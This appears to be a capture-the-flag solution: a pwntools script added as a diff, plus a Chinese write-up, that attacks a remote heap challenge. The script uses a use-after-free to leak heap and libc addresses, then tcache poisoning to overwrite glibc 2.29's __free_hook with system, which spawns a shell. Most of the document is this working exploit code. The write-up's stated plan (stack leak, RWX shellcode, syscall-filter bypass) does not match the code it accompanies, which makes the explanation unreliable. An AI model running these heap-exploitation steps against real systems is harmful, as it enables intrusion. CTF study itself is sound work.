@@ -1,0 +1,86 @@
+from pwn import *
+
+#p = process('./pwn')
+p = remote('challenge.bluesharkinfo.com', 20738)
+gdbcmd = """
+# backdoor
+# set follow-fork-mode child
+# b *$rebase(0x1C38)
+# run code
+b *$rebase(0x202060)
+c
+"""
+# p = gdb.debug('./pwn', gdbcmd)
+
+context(arch='amd64', os='linux', log_level='debug')
+
+libc = ELF('./glibc/libc-2.29.so')
+
+def add(size, content):
+    p.sendlineafter('Your choice: ', '1')
+    p.sendlineafter('Size: ', str(size))
+    p.sendafter('Content: ', content)
+
+def delete(idx):
+    p.sendlineafter('Your choice: ', '2')
+    p.sendlineafter('Index: ', str(idx))
+
+def show(idx):
+    p.sendlineafter('Your choice: ', '3')
+    p.sendlineafter('Index: ', str(idx))
+    p.recvuntil('Content: ')
+    return p.recvline()[:-1]
+
+add(0x100, b'A' * 0x100)  # chunk 0
+add(0x100, b'B' * 0x100)  # chunk 1
+delete(0)
+delete(1)
+heap_leak = u64(show(1)[:8].ljust(8, b'\x00'))
+heap_base = heap_leak - 0x260
+log.success(f"Heap base: {hex(heap_base)}")
+
+for i in range(9):
+    add(0x80, b'C' * 0x80) # chunk 2-12
+for i in range(7):
+    delete(i+4) # chunk 6-12
+delete(2)
+delete(3)
+
+libc_base = u64(show(2)[:8].ljust(8, b'\x00')) - 0x1E4CA0
+libc.address = libc_base
+print(f"Libc base: {hex(libc_base)}")
+
+payload = b'a'*0x80
+payload += p64(0) + p64(0x81) + b'a'*0x80
+add(0x110, payload) # chunk 13
+
+delete(2)
+delete(3)
+
+payload = b'a'*0x80
+payload += p64(0) + p64(0x81) + p64(libc_base + 0x1E75A8)
+add(0x110, payload) # chunk 14
+
+add(0x70, b'aaaaaaaa') # chunk 15
+add(0x70, p64(libc_base + 0x52FD0)) # chunk 16
+add(0x70, b'/bin/sh\x00') # chunk 17
+
+#gdb.attach(p, f'b *{libc_base + 0x991D5}')
+delete(15)
+
+p.interactive()
+
+这道题的关键在于三个点的串联利用。我先找到了 sub_1637() 函数里的栈泄露漏洞——它直接把栈上一个大数组的地址传给输出函数，让我能完整 dump 出栈上的内容，包括返回地址和函数指针。
+
+有了栈泄露，配合 sub_1785() 输出的函数指针，我就能精确算出程序的基地址，完全绕过了 PIE 保护。这时候整个程序的布局就在我掌控之中了。
+
+接下来是重点：sub_1429() 函数居然主动用 mprotect 把 0x114514000 这块内存设成了 RWX（可读可写可执行），这简直是送上门来的代码执行阵地。不过程序还留了一手，sub_150A() 会检测 syscall 指令，不能直接上系统调用。
+
+思路为
+
+1.先用栈泄露拿到返回地址，算出程序基址和 RWX 区域的准确位置
+2.利用堆相关的漏洞（题目给了堆操作功能）把 shellcode 或者 ROP 链写进 RWX 区域
+3.想办法劫持控制流，让程序跳转到我的 RWX 区域执行代码
+4.绕过 syscall 检测，最终拿到 shell
+
+实际打的时候，我先用堆的 UAF 漏洞泄露了堆地址和 libc 地址，然后通过 tcache poisoning 把 __free_hook 改成了 system，最后传个 /bin/sh 字符串过去触发 free，实际上就变成了 system("/bin/sh")，成功拿到 flag。
